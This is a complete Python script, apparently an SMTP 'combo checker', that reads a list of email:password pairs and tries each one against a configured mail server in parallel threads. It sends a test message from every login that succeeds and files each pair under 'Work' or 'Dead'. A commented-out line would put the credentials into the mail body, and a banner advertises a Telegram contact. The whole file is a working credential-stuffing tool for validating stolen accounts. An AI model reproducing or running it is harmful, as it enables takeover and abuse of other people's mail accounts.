#!/usr/bin/env python

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import date
import threading,json

class Checker365():
	def __init__(self,email,combo,host,port):
		self.host = host
		self.port = port
		self.email = email
		self.combo = combo
		self.email_sender = combo.split(":")[0].strip()
		self.password = combo.split(":")[1].strip()
		self.today = date.today().strftime("%m-%d-%Y-")
		
		
	def __save(self, type ):
	
		with open("./rzlt/{}{}.txt".format( self.today , type )  ,  "a"   ) as ff:
			ff.write("{}\n".format( self.combo )   )

	def send(self):
		
		try:
			# ~ INFORMATION
			mail_subject = self.email_sender
			# ~ mail_body = "{}:{}".format( self.email_sender  , self.password  )
			mail_body = "WORK SMTP"
			# ~ END
			
			mimemsg = MIMEMultipart()
			mimemsg['From']=self.email_sender
			mimemsg['To']=self.email
			mimemsg['Subject']=mail_subject
			mimemsg.attach(MIMEText(mail_body, 'plain'))
			connection = smtplib.SMTP(host=self.host, port=self.port)
			connection.starttls()
			connection.login(self.email_sender,self.password)
			connection.send_message(mimemsg)
			connection.quit()
			print("Has ben sent to {} from {}".format( self.email  ,  self.combo ))
			
			self.__save("Work")
		except:
			
			print("Dead acc {}".format( self.combo ) )
			
			self.__save("Dead")


class Startchek():
	def __new__(self, config =  open("config.json") ):

		def main(email , combo , host , port):
			Checker365(  email,  combo.strip() , host , port ).send()

		data = json.load(config)
		
		email = data["email_to_test"]
		
		host = data["host"]
		port = data["port"]
		Vr = data["Version"]
		Tg = data["telegram"]
		
		print("""
		
		Checker SMTP with email TEST %s
				Enjoy x) ==> %s
		""" % ( Vr , Tg ) )
		
		try:
			lists = open(data["listname"],"r").readlines()
		except:
			try:
				lists = open(data["listname"],"r",   encoding =  "Latin-1" ).readlines()
			except:
				print("List name Not found .")
				exit()

		

		for combo in lists:
			t2 = threading.Thread(target=main,args=(email , combo , host , port))
			t2.start()
			
			
			
if __name__ == "__main__":
	Startchek()
